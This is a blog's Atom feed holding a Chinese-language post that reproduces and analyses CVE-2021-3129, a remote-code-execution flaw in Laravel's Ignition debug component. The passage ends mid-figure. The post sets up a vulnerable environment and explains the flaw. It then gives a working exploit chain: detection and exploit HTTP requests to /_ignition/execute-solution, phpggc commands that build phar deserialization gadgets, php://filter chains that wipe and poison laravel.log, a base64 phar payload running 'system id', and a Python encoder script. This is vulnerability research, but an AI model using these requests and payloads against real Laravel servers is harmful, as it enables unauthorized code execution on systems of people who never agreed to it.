<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>reader-l&#39;s blog</title>
  
  <subtitle>虽然很慢，但仍在前进</subtitle>
  <link href="https://reader-l.github.io/atom.xml" rel="self"/>
  
  <link href="https://reader-l.github.io/"/>
  <updated>2021-06-12T14:41:10.360Z</updated>
  <id>https://reader-l.github.io/</id>
  
  <author>
    <name>reader-l</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2021-3129-Laravel-DebugModeRce漏洞复现分析</title>
    <link href="https://reader-l.github.io/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"/>
    <id>https://reader-l.github.io/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/</id>
    <published>2021-05-19T12:47:09.000Z</published>
    <updated>2021-06-12T14:41:10.360Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​    在CISCN2021的线上初赛有一道题就是利用<code>file_get_contents</code>反序列化phar的题目，当时是完全没有头绪。最近逛<code>freebuf</code>的时候看到<code>CVE-2021-3129</code>漏洞复现分析文章，觉得相似。因此打算复现学习一波。</p><h1 id="2-正文"><a href="#2-正文" class="headerlink" title="2.正文"></a>2.正文</h1><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>​    Laravel是一套简洁、开源的PHP Web开发框架，旨在实现Web软件的MVC架构。</p><p>​    2021年01月12日，<code>Laravel</code>被披露存在一个远程代码执行漏洞（<code>CVE-2021-3129</code>）。当<code>Laravel</code>开启了Debug模式时，由于<code>Laravel</code>自带的<code>Ignition </code>组件对<code>file_get_contents()</code>和<code>file_put_contents()</code>函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发<code>Phar</code>反序列化，最终造成远程代码执行。</p><h2 id="2-搭建环境"><a href="#2-搭建环境" class="headerlink" title="2.搭建环境"></a>2.搭建环境</h2><p>我一般是比较喜欢自己手动搭建的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">clone</span> https://github.com/laravel/laravel.git    <span class="hljs-comment"># 下载laravel源码</span></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> laravel</span><br><span class="hljs-meta">$</span><span class="bash"> git checkout e849812    <span class="hljs-comment"># 切换到存在漏洞的分支</span></span><br><span class="hljs-meta">$</span><span class="bash"> composer install        <span class="hljs-comment"># 安装依赖</span></span><br><span class="hljs-meta">$</span><span class="bash"> composer require facade/ignition==2.5.1    <span class="hljs-comment"># 下载安装存在漏洞版本的组件</span></span><br><span class="hljs-meta">$</span><span class="bash"> php artisan serve --host=0.0.0.0   <span class="hljs-comment"># 启动服务器</span></span><br></code></pre></td></tr></table></figure><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/2.png"></p><p>现在访问你搭建的环境后，会爆出如下异常：</p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/1.png"></p><p>要想解决这个异常，我们得根据<code>Ignition</code>（<code>Laravel 6+</code>默认错误页面生成器）提供了一个<code>solutions</code>，让我们在配置文件中给<code>Laravel</code>配置一个加密<code>APP_KEY</code>。</p><p>进入到laravel项目的根目录，将根目录里的”<code>.env.example</code>“重命名”<code>.env</code>“：</p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/3.png"></p><p>然后我们在刷新一下页面就可以了</p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/4.png"></p><h2 id="3-漏洞分析"><a href="#3-漏洞分析" class="headerlink" title="3.漏洞分析"></a>3.漏洞分析</h2><p>漏洞就发生在上面提到的给我们提供<code>solutions</code>的<code>Ignition</code>组件（&lt;=2.5.1）中。</p><p><code>Ignition</code>下默认提供如下<code>Solutions</code>（<code>laravel/vendor/facade/ignition/src/Solutions/</code>）：</p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/5.png"></p><p>通过这些solutions，只要开发者通过点击按钮的方式，就可以快速修复一些错误。</p><p>而这次漏洞出现在其中一个<code>solutions</code>：<code>vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php</code></p><p>首先去瞅瞅如何调用<code>solution</code>，执行<code>solution</code>的控制器是<code>ExecuteSolutionController.php</code>(<code>vendor\facade\ignition\src\Http\Controllers\ExecuteSolutionController.php</code>)</p><p>可以发现先通过该方法<code>$request-&gt;getRunnableSolution();</code>获得<code>solution</code>，然后在调用获得的<code>solution</code>的<code>run</code>方法来处理可控的<code>parameters</code>参数传过去。</p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/6.png"></p><p>这次的漏洞点是出现在<code>MakeViewVariableOptionalSolution</code>在这个<code>solution</code>，我就跟进这个<code>MakeViewVariableOptionalSolution#run</code>方法看看。</p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/7.png"></p><p>上图代码简化后如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">$contents = file<span class="hljs-constructor">_get_contents($<span class="hljs-params">parameters</span>[&#x27;<span class="hljs-params">viewFile</span>&#x27;])</span>;<br>file<span class="hljs-constructor">_put_contents($<span class="hljs-params">parameters</span>[&#x27;<span class="hljs-params">viewFile</span>&#x27;], $<span class="hljs-params">contents</span>)</span>;<br></code></pre></td></tr></table></figure><p>可以看到这里主要功能点是：读取一个给定的路径<code>$parameters[&#39;viewFile&#39;]</code>，并替换读取到的内容中的<code>$variableName</code>为<code>$variableName ?? &#39;&#39;</code>，之后写回文件中<code>$parameters[&#39;viewFile&#39;]</code>，这就是个矛盾点，相当于啥事情都没有干。。。</p><p>这里调用了<code>file_get_contents()</code>，同时参数可控的，所以或许可以通过<code>phar://</code>协议去触发反序列化（如果有开发人员利用该框架进行开发并且写出一个文件上传的功能，那我们可以通过上传一个恶意的Phar文件）。</p><h2 id="4-漏洞复现"><a href="#4-漏洞复现" class="headerlink" title="4.漏洞复现"></a>4.漏洞复现</h2><h3 id="1-漏洞检测"><a href="#1-漏洞检测" class="headerlink" title="1.漏洞检测"></a>1.漏洞检测</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.12:8000<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>168<br><br>&#123;<br>  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,<br>  &quot;parameters&quot;: &#123;<br>    &quot;variableName&quot;: &quot;username&quot;,<br>    &quot;viewFile&quot;: &quot;xxxxxxx&quot;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>只要我们发送以上数据包，并出现如下回显及证明存在该漏洞：</p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/8.png"></p><h3 id="2-复现方法：Phar反序列化（上传phar恶意文件）"><a href="#2-复现方法：Phar反序列化（上传phar恶意文件）" class="headerlink" title="2.复现方法：Phar反序列化（上传phar恶意文件）"></a>2.复现方法：Phar反序列化（上传phar恶意文件）</h3><p>使用<code>phpggc</code>工具生成一条<code>laravel</code>中存在的拓展的链子：</p><p><a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">php -d <span class="hljs-string">&quot;phar.readonly=0&quot;</span> .<span class="hljs-regexp">/phpggc Laravel/</span>RCE5 <span class="hljs-string">&quot;phpinfo();&quot;</span> --phar phar -o <span class="hljs-regexp">/home/</span>reader-l<span class="hljs-regexp">/Desktop/</span>phar.gif<br></code></pre></td></tr></table></figure><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/9.png"></p><p>将这个<code>phar.gif</code>传到目标服务器下。我们在复现中直接通过手动将其放置<code>laravel</code>目录下。</p><p>然后构造如下请求：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.199.246:8000<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>223<br><br>&#123;<br>  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,<br>  &quot;parameters&quot;: &#123;<br>    &quot;variableName&quot;: &quot;username&quot;,<br>    &quot;viewFile&quot;: &quot;phar:///home/www/wwwroot/127.0.0.1/laravel/phar.gif/test.txt&quot;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>复现成功：</p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/10.png"></p><p>以上的漏洞利用方法得基于你能将我们构造的恶意<code>phar.gif</code>上传上去。利用比较有限。</p><p>接下来的方法利用范围更大一些。</p><h3 id="3-复现方法：利用laravel-log实现phar反序列化"><a href="#3-复现方法：利用laravel-log实现phar反序列化" class="headerlink" title="3.复现方法：利用laravel.log实现phar反序列化"></a>3.复现方法：利用<code>laravel.log</code>实现phar反序列化</h3><h4 id="1-分析"><a href="#1-分析" class="headerlink" title="1.分析"></a>1.分析</h4><p>​    默认情况下，<code>laravel</code>的日志文件是放置在<code>storage/logs/laravel.log</code>文件下，用来储存一些PHP的错误和一些堆栈追踪的相关信息。</p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/11.png"></p><p>而如今我们要控制这个文件内容，将我们的payload写进log文件里，相当于将该Log文件构造成恶意的phar文件，在利用这个漏洞进行反序列化利用。</p><p>实现将log文件转变成恶意的phar文件。</p><p><strong>首先要进行的步骤就是将这个日志文件进行清空。</strong></p><p>首先我们通过观察可以发现日志文件的大概格式：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[previous log entries]</span><br><span class="hljs-selector-attr">[prefix]</span><span class="hljs-selector-tag">PAYLOAD</span><span class="hljs-selector-attr">[midfix]</span><span class="hljs-selector-tag">PAYLOAD</span><span class="hljs-selector-attr">[suffix]</span><br></code></pre></td></tr></table></figure><p>看了这篇文章的师傅或许会想到使用<code>php://filter</code>中的<code>convert.base64-decode</code>过滤器的特性，直到都为不可见字符解码清空，达到将log清空的目的。</p><p><a href="http://blog.orange.tw/2018/10/">http://blog.orange.tw/2018/10/</a></p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/12.png"></p><p>进行如下尝试，可以发现使用<code>php://filter/convert.base64-decode/resource</code>可以忽略一些坏字符并且成功解码写入。</p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/13.png"></p><p>但是令人失望的是，这种方法并不能达到我们将log清空的目的。虽然使用PHP在对字符串进行Base64解码时会忽略任何的坏字符，但是一个字符除外<code>=</code>。如果我们使用<code>base64-decode</code>过滤器过滤一个<code>=</code>中间包含<code>a</code>的字符串，PHP将产生错误并且不返回任何内容。因此，我们想用base64-decode来进行坏字符的过滤，必须有控制整个文件的可能性，但是这是不可能的，因为我们能够往日志文件写入的数据只有一小部分，同时在日志文件中还存在比较难以解决的<strong>日期前缀</strong>以及一些<strong>堆栈跟踪的后缀</strong>。</p><p>尝试对日期前缀家进行解码。</p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/15.png"></p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/14.png"></p><p>根据日期的不同，对前缀进行两次解码时，会得到不同大小的结果。当我们对它进行解码时，在第二种情况下，我们的payload将以2作为前缀，从而需要改变<code>base64</code>消息的对齐方式。</p><p>因此我们无法使用<code>php://filter/convert.base64-decode/resource</code>来实现清空日志文件的操作。</p><p>但是<code>php://filter</code>提供了一个新的方式：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=consumed/</span>resource=<span class="hljs-regexp">/path/</span>to/file.txt<br></code></pre></td></tr></table></figure><p>该方法可以帮助我们把日志给清空掉。</p><p><strong>第二个步骤是：往日志文件写入payload的同时，将前缀后缀这些无用的数据给清除掉，同时保留我们的payload。</strong></p><p>幸运的是我们修改日志文件内容的主要方式：<code>php://filter</code>不仅限于<code>base64</code>操作，还可以使用它来进行字符集转换的操作，比如：<code>UTF-16 到 UTF-8</code></p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/16.png"></p><p>从上图可以发现，非常符合我们将<code>laravel.log</code>转化为<code>phar</code>文件的第二个关键步骤：留下我们的payload，将其他无用数据进行转换（最后清除），但是还是有点问题，因为我们的payload会在一次会在日志文件中出现两次，我们最后的转化后也还是出现了两次，在把其它无用数据清楚后，有可能会造成干扰，因此我们需要将第二次的payload进行删除。</p><p>参考文章作者提供了一种思路：因为<code>UTF-16</code>是基于两字节的，因此我们可以在payload最后面增加一个字节。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">echo -ne &#x27;[Some prefix ]P<span class="hljs-symbol">\0</span>A<span class="hljs-symbol">\0</span>Y<span class="hljs-symbol">\0</span>L<span class="hljs-symbol">\0</span>O<span class="hljs-symbol">\0</span>A<span class="hljs-symbol">\0</span>D<span class="hljs-symbol">\0</span>X[midfix]P<span class="hljs-symbol">\0</span>A<span class="hljs-symbol">\0</span>Y<span class="hljs-symbol">\0</span>L<span class="hljs-symbol">\0</span>O<span class="hljs-symbol">\0</span>A<span class="hljs-symbol">\0</span>D<span class="hljs-symbol">\0</span>X[Some suffix ]&#x27; &gt; /tmp/test<br></code></pre></td></tr></table></figure><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/17.png"></p><p>完美的将第二个payload给去除，只留下一个。</p><p>现在我们需要的是实现将除payload以外的所有无用数据给清除掉。方法还是使用<code>base64-decode</code>!!!上面我们讨论过了，单单使用<code>base64-decode</code>并不能实现，但是可以配合<code>UTF-16 TO UTF-8</code>的字符集转换即可。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">echo</span> -n TEST! | base64 | sed -E <span class="hljs-string">&#x27;s/./\0\\0/g&#x27;</span><br>V\0E\0V\0T\0V\0C\0E\0=\0<br>$ <span class="hljs-built_in">echo</span> -ne <span class="hljs-string">&#x27;[Some prefix ]V\0E\0V\0T\0V\0C\0E\0=\0X[midfix]V\0E\0V\0T\0V\0C\0E\0=\0X[Some suffix ]&#x27;</span> &gt; /tmp/<span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">php &gt; <span class="hljs-built_in">echo</span> file_get_contents(<span class="hljs-string">&#x27;php://filter/read=convert.iconv.utf16le.utf-8|convert.base64-decode/resource=/tmp/test.txt&#x27;</span>);<br>TEST!<br></code></pre></td></tr></table></figure><p>我们还有一个问题，<code>UTF-16</code>转换字符集的时候需要两字节才不会出现问题。</p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/18.png"></p><p>文章作者对此的解决方法是利用NULL字符去填充payload，将其从一字节填充到两字节，但是在PHP中加载带着NULL字符的文件是会爆出错误的：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">PHP Warnin<span class="hljs-variable">g:</span>  file_get_contents() expects parameter <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">be</span> <span class="hljs-keyword">a</span> valid path, <span class="hljs-built_in">string</span> given in php <span class="hljs-keyword">shell</span> code <span class="hljs-keyword">on</span> <span class="hljs-built_in">line</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>因此是无法通过注入存在NULL字符的payload到日志文件中的，但是<code>php://filter</code>存在一种过滤器解决了这个问题：<a href="https://www.php.net/manual/en/filters.convert.php#filters.covert.quoted-printable">convert.quoted-printable-decode</a></p><p>我们可以将NULL字符通过使用<code>=00</code>进行编码，再用该过滤器进行解码即可。</p><p>最终使用的payload大概如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">viewFile: php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/</span>resource=<span class="hljs-regexp">/path/</span>to<span class="hljs-regexp">/storage/</span>logs/laravel.log<br></code></pre></td></tr></table></figure><h4 id="2-复现"><a href="#2-复现" class="headerlink" title="2.复现"></a>2.复现</h4><p>清空日志：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">viewFile: php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=consumed/</span>resource=<span class="hljs-regexp">/path/</span>to<span class="hljs-regexp">/storage/</span>logs/laravel.log<br></code></pre></td></tr></table></figure><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/19.png"></p><p>发送<code>AA</code>无用字符：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.199.246:8000<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>163<br><br>&#123;<br>  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,<br>  &quot;parameters&quot;: &#123;<br>    &quot;variableName&quot;: &quot;username&quot;,<br>    &quot;viewFile&quot;: &quot;AA&quot;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/21.png"></p><p>再者，用<code>PHPGGC</code>生成一个payload。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php -d<span class="hljs-string">&#x27;phar.readonly=0&#x27;</span> .<span class="hljs-regexp">/phpggc monolog/</span>rce1 system id --phar phar -o php:<span class="hljs-regexp">//</span>output | base64<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8</span>+DQq<span class="hljs-number">9</span>AgAAAgAAABEAAAABAAAAAABmAgAATzozMjoi<br><span class="hljs-attribute">TW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5</span><br><span class="hljs-attribute">OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7Tzoy</span><br><span class="hljs-attribute">OToiTW9ub2xvZ1xIYW5kbGVyXEJ1ZmZlckhhbmRsZXIiOjc6e3M6MTA6IgAqAGhhbmRsZXIiO047</span><br><span class="hljs-attribute">czoxMzoiACoAYnVmZmVyU2l6ZSI7aTotMTtzOjk6IgAqAGJ1ZmZlciI7YToxOntpOjA7YToyOntp</span><br><span class="hljs-attribute">OjA7czoyOiJpZCI7czo1OiJsZXZlbCI7Tjt9fXM6ODoiACoAbGV2ZWwiO047czoxNDoiACoAaW5p</span><br><span class="hljs-attribute">dGlhbGl6ZWQiO2I6MTtzOjE0OiIAKgBidWZmZXJMaW1pdCI7aTotMTtzOjEzOiIAKgBwcm9jZXNz</span><br><span class="hljs-attribute">b3JzIjthOjI6e2k6MDtzOjc6ImN1cnJlbnQiO2k6MTtzOjY6InN5c3RlbSI7fX1zOjEzOiIAKgBi</span><br><span class="hljs-attribute">dWZmZXJTaXplIjtpOi0xO3M6OToiACoAYnVmZmVyIjthOjE6e2k6MDthOjI6e2k6MDtzOjI6Imlk</span><br><span class="hljs-attribute">IjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7</span><br><span class="hljs-attribute">YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7</span><br><span class="hljs-attribute">aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0FAAAAZHVtbXkEAAAAL7jEYAQA</span><br><span class="hljs-attribute">AAAMfn</span>/YpAEAAAAAAAAIAAAAdGVzdC<span class="hljs-number">50</span>eHQEAAAAL<span class="hljs-number">7</span>jEYAQAAAAMfn/YpAEAAAAAAAB<span class="hljs-number">0</span>ZXN<span class="hljs-number">0</span>dGVz<br><span class="hljs-attribute">dGnV77FlmdRRcxEsm</span>+<span class="hljs-number">4</span>qIqC<span class="hljs-number">01</span>E<span class="hljs-number">8</span>AAgAAAEdCTUI=<br></code></pre></td></tr></table></figure><p>我们还需要将以上的payload进行字符集的转换：</p><p>这是在网上找的脚本：其中之所以在最终payload前加上<code>AAAAAAAAAAAAAAA</code>是为了解决一个坑点，我在进行复现的时候，发现我们传入的<code>payload</code>会出现在日志文件中三次，其中第三次是不完整的会导致我在对日志文件进行字符集转换的时候出现错误，因此我们需要在payload前填充15个无用字符来避免错误。</p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/20.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> b2a_hex<br>payload = <span class="hljs-string">&#x27;&#x27;&#x27;PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQq9AgAAAgAAABEAAAABAAAAAABmAgAATzozMjoi</span><br><span class="hljs-string">TW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5</span><br><span class="hljs-string">OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7Tzoy</span><br><span class="hljs-string">OToiTW9ub2xvZ1xIYW5kbGVyXEJ1ZmZlckhhbmRsZXIiOjc6e3M6MTA6IgAqAGhhbmRsZXIiO047</span><br><span class="hljs-string">czoxMzoiACoAYnVmZmVyU2l6ZSI7aTotMTtzOjk6IgAqAGJ1ZmZlciI7YToxOntpOjA7YToyOntp</span><br><span class="hljs-string">OjA7czoyOiJpZCI7czo1OiJsZXZlbCI7Tjt9fXM6ODoiACoAbGV2ZWwiO047czoxNDoiACoAaW5p</span><br><span class="hljs-string">dGlhbGl6ZWQiO2I6MTtzOjE0OiIAKgBidWZmZXJMaW1pdCI7aTotMTtzOjEzOiIAKgBwcm9jZXNz</span><br><span class="hljs-string">b3JzIjthOjI6e2k6MDtzOjc6ImN1cnJlbnQiO2k6MTtzOjY6InN5c3RlbSI7fX1zOjEzOiIAKgBi</span><br><span class="hljs-string">dWZmZXJTaXplIjtpOi0xO3M6OToiACoAYnVmZmVyIjthOjE6e2k6MDthOjI6e2k6MDtzOjI6Imlk</span><br><span class="hljs-string">IjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7</span><br><span class="hljs-string">YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7</span><br><span class="hljs-string">aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0FAAAAZHVtbXkEAAAAkYrEYAQA</span><br><span class="hljs-string">AAAMfn/YpAEAAAAAAAAIAAAAdGVzdC50eHQEAAAAkYrEYAQAAAAMfn/YpAEAAAAAAAB0ZXN0dGVz</span><br><span class="hljs-string">dFnC1rdK+he/VojBbla5FVr2USRhAgAAAEdCTUI=&#x27;&#x27;&#x27;</span> <span class="hljs-comment"># base64 payload</span><br>armedPayload = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload:<br>    i = <span class="hljs-string">&quot;=&quot;</span>+b2a_hex(i.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).upper()<br>    armedPayload += i+<span class="hljs-string">&quot;=00&quot;</span><br>print(<span class="hljs-string">&quot;AAAAAAAAAAAAAAA&quot;</span>+armedPayload)<span class="hljs-comment">#前面加15个字符</span><br></code></pre></td></tr></table></figure><figure 